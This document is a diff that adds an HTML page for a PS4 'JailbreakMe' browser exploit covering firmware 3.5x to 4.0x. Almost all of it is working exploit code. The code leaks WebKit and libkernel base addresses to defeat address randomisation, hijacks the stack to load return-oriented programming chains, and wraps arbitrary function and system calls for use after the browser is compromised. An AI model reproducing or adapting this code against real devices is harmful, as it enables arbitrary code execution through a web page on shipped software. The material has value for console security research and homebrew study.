@@ -1,0 +1,308 @@
+<!-- This page was originally made by qwertyoruiopz -->
+<html>
+<head>
+  <title>JailbreakMe PS4 3.5x/3.70/4.0x</title>
+  <meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+  <meta name="apple-mobile-web-app-capable" content="no">
+  <meta name="format-detection" content="telephone=no">
+  <link rel="apple-touch-icon" href="touch-icon-iphone.png">
+  <meta name="apple-mobile-web-app-title" content="JailbreakMe" />
+  <style>
+    body
+    {
+      overflow: hidden;
+      position: fixed;
+      position: relative;
+    }
+
+    h1
+    {
+      overflow: hidden;
+      position: fixed;
+      position: absolute;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    footer
+    {
+      position: absolute;
+      left: 0;
+      bottom: 0;
+      height: 40px;
+      width: 100%;
+      overflow:hidden;
+    }
+  </style>
+  <script src=syscalls.js></script>
+</head>
+<body>
+  <script>
+    /* Get user agent for determining system firmware */
+    var ua = navigator.userAgent;
+
+    /* Called from exploit.js upon success */
+    window.postexploit = function(p)
+    {
+      var fwFromUA = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
+      document.getElementById("clck").style.display = 'none';
+
+      var print = function(string) {
+        document.getElementById("console").innerHTML += string + "\n";
+      }
+
+      print("=== Exploit Successful ===");
+
+      /* Used to leak parseFloat() for deriving webkit's base address and calling */
+      p.leakFunction = function(smashFunction) {
+        var smashObj  = p.leakval(smashFunction);
+        var smashBase = p.read8(smashObj.add32(0x18));
+        return smashBase.add32(0x20);
+      }
+
+      var funcPointer = p.read8(p.leakFunction(parseFloat));
+
+      /* Calculate slide */
+      var webkitBase = funcPointer.add32(0); // copy
+      webkitBase.low &= ~0xFFF;
+      webkitBase.sub32inplace(0x55000);
+
+      moduleBaseAddresses['libSceWebKit2']  = webkitBase;
+
+      /* Get import map based on firmware from user-agent string */
+      generateBasicImportMap();
+
+      if(window.basicImportMap[fwFromUA] != null)
+      {
+        window.basicImports = window.basicImportMap[fwFromUA];
+      }
+      else
+      {
+        throw new Error("System may be vulnerable but does not have a valid import map!");
+      }
+
+      /*
+        I was originally going to calculate libkernel's address via libSceSysmodule
+        however since we may require libkernel's address for some gadgets in the future
+        anyway, it's better to do it qwerty's way by leaking the stack_chk_fail import pointer.
+      */
+      var libkernel = p.read8(window.basicImports['__stack_chk_fail']);
+      libkernel.low &= ~0xFFF;
+      libkernel.sub32inplace(0xd000);
+
+      moduleBaseAddresses['libkernel']  = libkernel;
+
+      /* Get gadget map based on firmware from user-agent string */
+      generateGadgetMap();
+
+      if(gadgetMap[fwFromUA] != null)
+      {
+        window.gadgets = gadgetMap[fwFromUA];
+      }
+      else
+      {
+        throw new Error("System may be vulnerable but does not have a valid gadget map!");
+      }
+
+      /* Get syscall map based on firmware from user-agent string */
+      if(syscallMap[fwFromUA] != null)
+      {
+        window.syscalls = syscallMap[fwFromUA];
+      }
+      else
+      {
+        alert("Your system does not have a valid system call map! The exploit will still work but calling syscalls will not function properly...");
+      }
+
+      /* Print out results */
+      print("WebKit Base Located - Address: 0x" + webkitBase);
+      print("LibKernel Base Located - Address: 0x" + libkernel);
+
+      var funcPtrStore = p.leakFunction(parseFloat);
+      var funcArgs = [];
+
+      for(var i = 0; i < 0x7FFF; i++)
+        funcArgs[i] = 0x41410000 | i;
+
+      /* Ensure everything is aligned and the layout is intact */
+      var argBuffer = new Uint32Array(0x1000);
+      var argPointer = p.read8(p.leakval(argBuffer).add32(0x28));
+      argBuffer[0] = 0x13371337;
+
+      if(p.read4(argPointer) != 0x13371337)
+      {
+        throw new Error("Stack frame is not aligned!");
+      }
+
+      window.dont_tread_on_me = [argBuffer];
+
+      /* Load ROP chain into memory */
+      p.loadchain = function(chain)
+      {
+        var stackPointer = 0;
+        var stackCookie = 0;
+        var origRIP = 0;
+
+        var reEntry =
+        {
+          length:
+          {
+            valueOf: function()
+            {
+              origRIP = p.read8(stackPointer);
+              var returnToFrame = stackPointer;
+
+              var ocnt = chain.count;
+              chain.push64(stackPointer, origRIP);
+              chain.push64(stackPointer.add32(8), stackCookie);
+
+              if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
+
+              chain.push(window.gadgets["pop rsp"]);
+              chain.push(returnToFrame);
+              chain.count = ocnt;
+
+              p.write8(stackPointer, window.gadgets["pop rsp"]);
+              p.write8(stackPointer.add32(8), chain.ropChainPtr);
+
+              return 0;
+            }
+          }
+        };
+
+        return (function()
+        {
+          /* Clear stack frame */
+          (function(){}).apply(null, funcArgs);
+
+          /* Recover frame */
+          var orig = p.read8(funcPtrStore);
+          p.write8(funcPtrStore, window.gadgets["mov rax, rdi"]);
+
+          /* Setup frame */
+          var trap = p.leakval(parseFloat());
+          var rtv = 0;
+          var fakeval = new int64(0x41414141, 0xffff0000);
+
+          (function()
+          {
+            var val = p.read8(trap.add32(0x100));
+            if ((val.hi != 0xffff0000) || ((val.low & 0xFFFF0000) != 0x41410000))
+            {
+              throw new Error("Stack frame corrupted!");
+            }
+          }).apply(null, funcArgs);
+
+          /* Write vtable, setjmp stub, and 'jump rax' gadget */
+          p.write8(argPointer, argPointer.add32(0x100));
+          p.write8(argPointer.add32(0x130), window.basicImports["setjmp"]);
+          p.write8(funcPtrStore, window.gadgets["jmp addr"]);
+
+          /* Clear and write to frame */
+          (function(){}).apply(null, funcArgs);
+          p.write8(trap.add32(0x18), argPointer);
+          p.leakval(parseFloat()); // Jumps to "setjmp" function stub in libkernel
+
+          /* Finish by resetting the stack's base pointer and canary */
+          stackPointer = p.read8(argPointer.add32(0x10));
+          stackCookie = p.read8(stackPointer.add32(8));
+
+          rtv=Array.prototype.splice.apply(reEntry);
+          p.write8(trap.add32(0x18), fakeval);
+          p.write8(trap.add32(0x18), orig);
+
+          return p.leakval(rtv);
+        }).apply(null, funcArgs);
+      }
+
+      p.call = function(rip, rdi, rsi, rdx, rcx, r8, r9) {
+        var chain = new rop(p);
+        chain.call(rip, rdi, rsi, rdx, rcx, r8, r9);
+
+        chain.push(window.gadgets["pop rdi"]);
+        chain.push(chain.ropChainPtr.add32(0x3ff8));
+        chain.push(window.gadgets["mov qword ptr [rdi], rax"]);
+        chain.push(window.gadgets["pop rax"]);
+        chain.push(p.leakval(0x41414242));
+
+        if (chain.run().low != 0x41414242) throw new Error("unexpected rop behaviour");
+
+        /*
+          Originally for some reason, it will read in hex, so .toString(10)
+          converts back to decimal.
+        */
+        return p.read8(chain.ropChainPtr.add32(0x3ff8)).toString(10);
+      }
+
+      p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9)
+      {
+        if (typeof sysc == "string")
+        {
+          sysc = window.syscallnames[sysc];
+        }
+
+        if (typeof sysc != "number")
+        {
+          throw new Error("System call map does not contain an index for this syscall!");
+        }
+
+        var off = window.syscalls[sysc];
+        if (off == undefined)
+        {
+          throw new Error("System call map does not contain an index for this syscall!");
+        }
+
+        return p.call(libkernel.add32(off), rdi, rsi, rdx, rcx, r8, r9);
+      }
+
+      p.readstr = function(addr){
+        var addr_ = addr.add32(0);
+        var rd = p.read4(addr_);
+        var buf = "";
+        while (rd & 0xFF)
+        {
+          buf += String.fromCharCode(rd & 0xFF);
+          addr_.add32inplace(1);
+          rd = p.read4(addr_);
+        }
+        return buf;
+      }
+
+
+
+
+      /*
+        Everything above this line (275) does NOT NEED TO BE TOUCHED, that is,
+        if you don't care about breaking things or you for some reason want to
+        edit the core setup, which you shouldn't need to do. Everything below is
+        ez mode.
+      */
+
+      var idx = 0;
+
+      window.trycall = function() {
+        print("call ret: " + p.call(window.gadgets["mov rax, rdi"], idx));
+        idx++;
+      }
+
+      window.getPID = function() {
+        print("sys_getpid(): " + p.syscall("sys_getpid"));
+      }
+
+      window.getUID = function() {
+        print("sys_getuid(): " + p.syscall("sys_getuid"));
+      }
+
+      print("<a href=javascript:window.trycall();>try call</a>");
+      print("<a href=javascript:window.getPID();>try sys_getpid()</a>");
+      print("<a href=javascript:window.getUID();>try sys_getuid()</a>");
+    }
+  </script>
+  <script src=expl.js></script>
+  <script src=gadgets.js></script>
+  <script src=rop.js></script>
+  <center><h1 id=clck>...</h1><strong>By <a href='https://twitter.com/qwertyoruiopz'>qwertyoruiopz</a></strong><br/>Edited by <a href='https://twitter.com/specterdev'>SpecterDev</a><br/>This exploit has been cleaned up a bit and now has multi-firmware support!<br/></center>
+  <pre id="console" style="font-size: 20px"></pre>
+</body>
+</html>
